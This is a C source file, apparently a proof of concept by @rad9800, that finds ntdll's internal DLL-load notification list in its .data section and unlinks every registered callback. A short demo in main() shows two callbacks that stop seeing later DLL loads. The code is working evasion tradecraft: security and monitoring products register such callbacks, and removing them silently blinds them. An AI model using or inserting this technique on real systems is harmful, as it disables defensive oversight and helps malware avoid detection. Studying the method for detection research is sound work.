/* UnregisterAllLdrRegisterDllNotification.c by @rad9800
 * Credit goes to:
 * - Whoever at mdsec discovered the technique
 * - Proofpoint threatinsight team for their detailed analysis
 *
 * Removes the LdrRegisterDllNotification by located the head of the
 * doubly-linked list in the .data section of NTDLL and then walking
 * it and removing each link entry.
 *
 */
#include <Windows.h>
#include <winternl.h>
#include <stdio.h> // printf

#define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )

#define IMPORTAPI( DLLFILE, FUNCNAME, RETTYPE, ...)\
typedef RETTYPE( WINAPI* type##FUNCNAME )( __VA_ARGS__ );\
type##FUNCNAME FUNCNAME = (type##FUNCNAME)GetProcAddress((LoadLibraryW(DLLFILE), GetModuleHandleW(DLLFILE)), #FUNCNAME);



typedef struct _LDR_DLL_UNLOADED_NOTIFICATION_DATA {
	ULONG Flags;                    //Reserved.
	PCUNICODE_STRING FullDllName;   //The full path name of the DLL module.
	PCUNICODE_STRING BaseDllName;   //The base file name of the DLL module.
	PVOID DllBase;                  //A pointer to the base address for the DLL in memory.
	ULONG SizeOfImage;              //The size of the DLL image, in bytes.
} LDR_DLL_UNLOADED_NOTIFICATION_DATA, * PLDR_DLL_UNLOADED_NOTIFICATION_DATA;

typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA {
	ULONG Flags;                    //Reserved.
	PCUNICODE_STRING FullDllName;   //The full path name of the DLL module.
	PCUNICODE_STRING BaseDllName;   //The base file name of the DLL module.
	PVOID DllBase;                  //A pointer to the base address for the DLL in memory.
	ULONG SizeOfImage;              //The size of the DLL image, in bytes.
} LDR_DLL_LOADED_NOTIFICATION_DATA, * PLDR_DLL_LOADED_NOTIFICATION_DATA;

typedef union _LDR_DLL_NOTIFICATION_DATA {
	LDR_DLL_LOADED_NOTIFICATION_DATA Loaded;
	LDR_DLL_UNLOADED_NOTIFICATION_DATA Unloaded;
} LDR_DLL_NOTIFICATION_DATA, * PLDR_DLL_NOTIFICATION_DATA;

typedef VOID(CALLBACK* LdrDllNotification)(ULONG, const PLDR_DLL_NOTIFICATION_DATA, PVOID);

VOID DllloadCallback(ULONG NotificationReason, const PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context)
{
	if (NotificationReason == 1)
	{
		if (NotificationData->Loaded.FullDllName)
		{
			printf("DllloadCallback: DLL loaded %wZ\n", NotificationData->Loaded.FullDllName);
		}
	}
	else
	{
		if (NotificationData->Unloaded.FullDllName)
		{
			printf("DllloadCallback: DLL Un-loaded %wZ\n", NotificationData->Unloaded.FullDllName);
		}
	}
}

VOID DllloadCallback2(ULONG NotificationReason, const PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context)
{
	if (NotificationReason == 1)
	{
		if (NotificationData->Loaded.FullDllName)
		{
			printf("DllloadCallback2: DLL loaded %wZ\n", NotificationData->Loaded.FullDllName);
		}
	}
	else
	{
		if (NotificationData->Unloaded.FullDllName)
		{
			printf("DllloadCallback2: DLL Un-loaded %wZ\n", NotificationData->Unloaded.FullDllName);
		}
	}
}


LIST_ENTRY* getDllLoadNotifications()
{
	IMPORTAPI(L"NTDLL.dll", LdrRegisterDllNotification, NTSTATUS, ULONG, LdrDllNotification, PVOID, PVOID*);
	IMPORTAPI(L"NTDLL.dll", LdrUnregisterDllNotification, NTSTATUS, PVOID);

	PVOID cookie;

	NTSTATUS status = LdrRegisterDllNotification(0, (LdrDllNotification)DllloadCallback, NULL, &cookie);
	if (NT_SUCCESS(status))
	{
		printf("Original Cookie: 0x%p\n", cookie);
		const LIST_ENTRY* LdrpDllNotificationList = cookie;
		//
		// Get .data size 
		//
		const LIST_ENTRY* head = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList;
		LIST_ENTRY* next = head->Flink;

		while (next != head)
		{
			LDR_DATA_TABLE_ENTRY* entry =
				CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
			const UNICODE_STRING* basename = (UNICODE_STRING*)((BYTE*)&entry->FullDllName
				+ sizeof(UNICODE_STRING));

			if (_wcsicmp(basename->Buffer, L"ntdll.dll") == 0)
			{
				PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((ULONG_PTR)entry->DllBase
					+ ((PIMAGE_DOS_HEADER)entry->DllBase)->e_lfanew);

				for (int j = 0; j < nt->FileHeader.NumberOfSections; j++) {
					const PIMAGE_SECTION_HEADER section =
						(PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt) +
							(DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * j);

					if ((*(ULONG*)section->Name | 0x20202020) == 'tad.') {

						PVOID dataBase = (PVOID)((ULONG_PTR)entry->DllBase
							+ section->VirtualAddress);
						PVOID dataEnd = (PVOID)((PULONG)dataBase + section->Misc.VirtualSize);

						LIST_ENTRY* LdrpDllNotificationListNext = LdrpDllNotificationList->Flink;
						while (LdrpDllNotificationListNext != LdrpDllNotificationList)
						{
							if (LdrpDllNotificationListNext >= dataBase &&
								LdrpDllNotificationListNext <= dataEnd)
							{
								printf("Found LdrpDllNotificationList: 0x%p\n", LdrpDllNotificationListNext);
								printf("0x%p >= 0x%p &&\n0x%p <= 0x%p\n",
									LdrpDllNotificationListNext, dataBase, LdrpDllNotificationListNext, dataEnd);

								LdrUnregisterDllNotification(cookie);

								return LdrpDllNotificationListNext;
							}
							LdrpDllNotificationListNext = LdrpDllNotificationListNext->Flink;
						}

						break;
					}
				}

			}
			next = next->Flink;
		}
	}
}

LIST_ENTRY* removeDllLoadNotifications()
{
	LIST_ENTRY* dllNotificationList = NULL;
	if (dllNotificationList = getDllLoadNotifications())
	{
		LIST_ENTRY* head = dllNotificationList;
		LIST_ENTRY* next = dllNotificationList->Flink;
		while (next != head)
		{

			printf("Un-registering 0x%p\n", next);

			LIST_ENTRY* oldFlink;
			LIST_ENTRY* oldBlink;
			oldFlink = next->Flink;
			oldBlink = next->Blink;
			oldFlink->Blink = oldBlink;
			oldBlink->Flink = oldFlink;
			next->Flink = NULL;
			next->Blink = NULL;

			next = oldFlink;
		}
	}
	return dllNotificationList;
}

int main()
{
	IMPORTAPI(L"NTDLL.dll", LdrRegisterDllNotification, NTSTATUS, ULONG, LdrDllNotification, PVOID, PVOID*);

	PVOID cookie;
	LIST_ENTRY* LdrpDllNotificationListHead;

	LdrRegisterDllNotification(0, (LdrDllNotification)DllloadCallback, NULL, &cookie);
	LdrRegisterDllNotification(0, (LdrDllNotification)DllloadCallback2, NULL, &cookie);

	LoadLibraryA("DBGHELP.dll");

	// Uncomment this if ya like
	//LoadLibraryA("DBGENG.dll");

	LdrpDllNotificationListHead = removeDllLoadNotifications();

	//
	// None of our the registered DLL notifications will see the DLL loads
	// to see the effect just uncomment the earlier LoadLibraryA
	//
	LoadLibraryA("DBGENG.dll");

}
